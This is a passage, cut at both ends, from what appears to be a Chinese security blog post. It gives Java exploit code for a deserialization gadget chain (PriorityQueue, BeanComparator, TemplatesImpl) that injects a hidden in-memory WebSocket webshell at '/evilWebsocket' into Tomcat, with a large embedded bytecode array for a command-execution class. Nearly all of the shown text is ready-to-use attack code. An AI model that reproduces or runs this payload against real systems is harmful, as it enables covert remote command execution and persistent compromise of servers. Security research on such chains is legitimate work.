class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">        <span class="comment">// stub data for replacement later</span></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj, obj&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> queue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@org</span>.junit.Test</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test1</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">payload</span> <span class="operator">=</span> getpayload();</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        outputStream.writeObject(payload);</span><br><span class="line">        outputStream.flush();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">codes</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());</span><br><span class="line">        System.out.println(codes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@org</span>.junit.Test</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test2</span><span class="params">()</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = ClassPool.getDefault().get(EvilWebsocket.class.getName()).toBytecode();</span><br><span class="line">        System.out.println(Arrays.toString(bytes));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行test2获取到EvilWebsocket类的字节码，之后更改 下面WebsocketTemplatesImpl类中的bytes即可：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationFilterChain;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.loader.WebappClassLoaderBase;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.webresources.StandardRoot;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.websocket.server.WsServerContainer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletContext;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.websocket.*;</span><br><span class="line"><span class="keyword">import</span> javax.websocket.server.ServerContainer;</span><br><span class="line"><span class="keyword">import</span> javax.websocket.server.ServerEndpointConfig;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebsocketTemplatesImpl</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFinalStatic</span><span class="params">(Field field)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">modifiersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">        modifiersField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        modifiersField.setInt(field, field.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">urlPath</span> <span class="operator">=</span> <span class="string">&quot;/evilWebsocket&quot;</span>;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">WRAP_SAME_OBJECT_FIELD</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>).getDeclaredField(<span class="string">&quot;WRAP_SAME_OBJECT&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedRequestField</span> <span class="operator">=</span> ApplicationFilterChain.class.getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedResponseField</span> <span class="operator">=</span> ApplicationFilterChain.class.getDeclaredField(<span class="string">&quot;lastServicedResponse&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//修改static final</span></span><br><span class="line">            setFinalStatic(WRAP_SAME_OBJECT_FIELD);</span><br><span class="line">            setFinalStatic(lastServicedRequestField);</span><br><span class="line">            setFinalStatic(lastServicedResponseField);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//静态变量直接填null即可</span></span><br><span class="line">            ThreadLocal&lt;ServletRequest&gt; lastServicedRequest = (ThreadLocal&lt;ServletRequest&gt;) lastServicedRequestField.get(<span class="literal">null</span>);</span><br><span class="line">            ThreadLocal&lt;ServletResponse&gt; lastServicedResponse = (ThreadLocal&lt;ServletResponse&gt;) lastServicedResponseField.get(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!WRAP_SAME_OBJECT_FIELD.getBoolean(<span class="literal">null</span>) || lastServicedRequest == <span class="literal">null</span> || lastServicedResponse == <span class="literal">null</span>)&#123;</span><br><span class="line">                WRAP_SAME_OBJECT_FIELD.setBoolean(<span class="literal">null</span>,<span class="literal">true</span>);</span><br><span class="line">                lastServicedRequestField.set(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>());</span><br><span class="line">                lastServicedResponseField.set(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>());</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">ServletRequest</span> <span class="variable">servletRequest</span> <span class="operator">=</span> lastServicedRequest.get();</span><br><span class="line">                <span class="type">ServletResponse</span> <span class="variable">servletResponse</span> <span class="operator">=</span> lastServicedResponse.get();</span><br><span class="line"></span><br><span class="line">                <span class="comment">//开始注入内存马</span></span><br><span class="line">                <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> servletRequest.getServletContext();</span><br><span class="line">                <span class="type">ClassLoader</span> <span class="variable">cl</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">                Class clazz;</span><br><span class="line">                <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;-<span class="number">54</span>, -<span class="number">2</span>, -<span class="number">70</span>, -<span class="number">66</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">52</span>, <span class="number">0</span>, -<span class="number">110</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">30</span>, <span class="number">0</span>, <span class="number">75</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">76</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">77</span>, <span class="number">0</span>, <span class="number">78</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">79</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">80</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">81</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">82</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">83</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">84</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">85</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">86</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">87</span>, <span class="number">0</span>, <span class="number">88</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">87</span>, <span class="number">0</span>, <span class="number">89</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">90</span>, <span class="number">0</span>, <span class="number">91</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">92</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">93</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">94</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">95</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">96</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">97</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">98</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">29</span>, <span class="number">0</span>, <span class="number">99</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">100</span>, <span class="number">0</span>, <span class="number">101</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">102</span>, <span class="number">0</span>, <span class="number">103</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">104</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">0</span>, <span class="number">105</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">100</span>, <span class="number">0</span>, <span class="number">106</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">29</span>, <span class="number">0</span>, <span class="number">107</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">108</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">109</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">111</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">120</span>, <span class="number">47</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">115</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">60</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">105</span>, <span class="number">116</span>, <span class="number">62</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">67</span>, <span class="number">111</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">76</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">78</span>, <span class="number">117</span>, <span class="number">109</span>, <span class="number">98</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">84</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">76</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">97</span>, <span class="number">108</span>, <span class="number">86</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">84</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">116</span>, <span class="number">104</span>, <span class="number">105</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">76</span>, <span class="number">69</span>, <span class="number">118</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">87</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">115</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">77</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">105</span>, <span class="number">115</span>, <span class="number">76</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">117</span>, <span class="number">120</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">90</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">111</span>, <span class="number">115</span>, <span class="number">84</span>, <span class="number">121</span>, <span class="number">112</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">99</span>, <span class="number">109</span>, <span class="number">100</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">91</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">99</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">111</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">101</span>, <span class="number">120</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">112</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">112</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">109</span>, <span class="number">109</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">77</span>, <span class="number">97</span>, <span class="number">112</span>, <span class="number">84</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">82</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">48</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">112</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">92</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">108</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">104</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">79</span>, <span class="number">112</span>, <span class="number">101</span>, <span class="number">110</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">60</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">120</span>, <span class="number">47</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">115</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">59</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">120</span>, <span class="number">47</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">115</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">69</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">112</span>, <span class="number">111</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">67</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">102</span>, <span class="number">105</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">102</span>, <span class="number">105</span>, <span class="number">103</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">32</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">120</span>, <span class="number">47</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">115</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">69</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">112</span>, <span class="number">111</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">67</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">102</span>, <span class="number">105</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">79</span>, <span class="number">98</span>, <span class="number">106</span>, <span class="number">101</span>, <span class="number">99</span>, <span class="number">116</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">83</span>, <span class="number">105</span>, <span class="number">103</span>, <span class="number">110</span>, <span class="number">97</span>, <span class="number">116</span>, <span class="number">117</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">87</span>, <span class="number">104</span>, <span class="number">111</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">67</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">84</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">120</span>, <span class="number">47</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">115</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">69</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">112</span>, <span class="number">111</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">59</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">120</span>, <span class="number">47</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">115</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">77</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">101</span>, <span class="number">72</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">36</span>, <span class="number">87</span>, <span class="number">104</span>, <span class="number">111</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">60</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">62</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">83</span>, <span class="number">111</span>, <span class="number">117</span>, <span class="number">114</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">70</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">69</span>, <span class="number">118</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">87</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">115</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">46</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">34</span>, <span class="number">0</span>, <span class="number">35</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">111</span>, <span class="number">115</span>, <span class="number">46</span>, <span class="number">110</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">113</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">114</span>, <span class="number">0</span>, <span class="number">115</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">116</span>, <span class="number">0</span>, <span class="number">117</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">119</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">118</span>, <span class="number">0</span>, <span class="number">119</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">115</span>, <span class="number">104</span>, <span class="number">1</span>, <span class="number">0</span>, <span 